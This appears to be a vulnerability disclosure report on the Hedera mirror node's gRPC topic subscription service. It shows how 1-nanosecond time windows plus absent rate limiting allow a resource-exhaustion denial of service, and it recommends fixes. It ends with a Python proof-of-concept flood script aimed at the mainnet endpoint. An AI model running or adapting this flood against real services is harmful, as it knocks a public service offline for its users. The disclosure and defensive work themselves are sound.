### Title
Unauthenticated gRPC Subscription Flooding via Minimal Time-Window Requests Causes Resource Exhaustion

### Summary
The `toFilter()` method in `ConsensusController` accepts any `consensusEndTime` that is strictly greater than `consensusStartTime` (including a 1-nanosecond window), with no minimum window enforcement and no rate limiting in the gRPC layer. An unauthenticated attacker can open many connections and rapidly cycle through subscription requests with a 1ns past time window, each of which completes in milliseconds after triggering two database queries, exhausting the DB connection pool and the bounded-elastic thread pool.

### Finding Description

**Code path:**

`ConsensusController.toFilter()` (lines 55–73) converts the protobuf timestamps directly into a `TopicMessageFilter` with no relationship validation between `startTime` and `endTime`:

```java
if (query.hasConsensusStartTime()) {
    long startTime = convertTimestamp(query.getConsensusStartTime());
    filter.startTime(startTime);
}
if (query.hasConsensusEndTime()) {
    long endTime = convertTimestamp(query.getConsensusEndTime());
    filter.endTime(endTime);
}
```

The only guard is in `TopicMessageFilter.isValidEndTime()` (lines 43–46):

```java
public boolean isValidEndTime() {
    return endTime == null || endTime > startTime;
}
```

This allows `endTime = startTime + 1` (1 nanosecond). With both timestamps in the past, `TopicContext.isComplete()` (line 208) immediately returns `true` (`filter.getEndTime() < startTime` where `startTime` is `DomainUtils.now()` at subscription time), so:

- `incomingMessages()` returns `Flux.empty()` immediately.
- `pastEndTime()` emits `Flux.empty()` immediately.
- The `safetyCheck` Flux (1s delay) is filtered out by `!topicContext.isComplete()`.
- Only the `historical` Flux runs — triggering a JPA `getResultList()` call on the bounded-elastic scheduler.

Additionally, `topicExists()` issues a synchronous `entityRepository.findById()` DB call before the flux even starts.

**Result per request**: 2 DB queries, full reactive chain allocation (`TopicContext`, 4 `Flux` objects, `AtomicLong`, `AtomicReference`, `Stopwatch`), then immediate teardown — all within milliseconds.

**No rate limiting exists in the gRPC module.** The `ThrottleConfiguration`/`ThrottleManagerImpl` (bucket4j) exists only in the `web3` module. The only gRPC-level protection is `maxConcurrentCallsPerConnection = 5` (`NettyProperties`, line 14), which is a **per-connection** limit. There is no global connection count limit, no global concurrent-call limit, and no per-IP or per-second request cap.

### Impact Explanation

An attacker opening N connections can sustain 5N concurrent in-flight subscriptions. Because each completes in milliseconds, the effective request rate is orders of magnitude higher than 5N. Each request issues two blocking DB queries on the bounded-elastic scheduler (default: 10 × CPU threads). With enough connections, the bounded-elastic thread pool saturates, the JPA/JDBC connection pool is exhausted, and the mirror node becomes unable to serve any gRPC or dependent workloads. This renders the HCS topic subscription service completely unavailable.

### Likelihood Explanation

No authentication or API key is required to call `subscribeTopic`. The protobuf fields `consensusStartTime` and `consensusEndTime` are freely settable by any client. The attack requires only a gRPC client library and a valid (or even non-existent, if `checkTopicExists=false`) topic ID. The pattern is trivially scriptable and repeatable. The per-connection call limit of 5 is easily bypassed by opening many TCP connections, which is standard in any HTTP/2-based flood tool.

### Recommendation

1. **Add a minimum time-window floor** in `TopicMessageFilter.isValidEndTime()` or in `toFilter()`: reject requests where `endTime - startTime < some_minimum` (e.g., 1 second).
2. **Implement gRPC-layer rate limiting**: add a token-bucket rate limiter (analogous to the existing `ThrottleConfiguration` in `web3`) applied per-IP or globally in `ConsensusController.subscribeTopic()` or as a gRPC server interceptor.
3. **Add a global concurrent-subscription cap**: use the existing `subscriberCount` `AtomicLong` to reject new subscriptions above a configurable threshold.
4. **Add a global connection limit** via `NettyServerBuilder.maxConnectionAge` / `maxConnectionIdle` and a total connection count cap.

### Proof of Concept

```python
import grpc
import threading
from hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import timestamp_pb2, basic_types_pb2

MIRROR_GRPC = "mirror.mainnet.hedera.com:443"
TOPIC_NUM = 1  # any valid topic

def flood():
    channel = grpc.secure_channel(MIRROR_GRPC, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    past_t = timestamp_pb2.Timestamp(seconds=1000000, nanos=0)
    past_t_plus1 = timestamp_pb2.Timestamp(seconds=1000000, nanos=1)  # +1 ns
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=TOPIC_NUM),
        consensusStartTime=past_t,
        consensusEndTime=past_t_plus1,
    )
    while True:
        try:
            list(stub.subscribeTopic(query))  # completes in ms, triggers 2 DB queries
        except Exception:
            pass

# Open many connections, each cycling 5 concurrent calls
for _ in range(500):
    threading.Thread(target=flood, daemon=True).start()
```

Each thread opens a new HTTP/2 connection. With 500 connections × 5 concurrent calls × rapid cycling, the server's bounded-elastic thread pool and DB connection pool are exhausted within seconds.
